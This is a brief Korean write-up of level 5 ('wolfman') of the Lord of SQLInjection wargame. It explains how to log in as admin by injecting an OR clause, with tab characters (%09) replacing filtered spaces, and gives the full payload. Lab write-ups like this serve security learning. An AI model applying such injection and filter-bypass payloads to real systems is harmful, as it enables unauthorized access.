Lord of SQLInjection 
wolfman 문제 [5단계]
쿼리문 : select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'
3번 문제와 유사한 문제이다.
pw에 임의의 값을 넣고 or id='admin' 을 쿼리문에
입력하면 된다. 3번 문제와 다르게 공백도 필터링 되기 때문에 tab 의 url인코딩 값을 이용해서 공백을 대신한다
tab : %09
pw=1'%09or%09id='admin'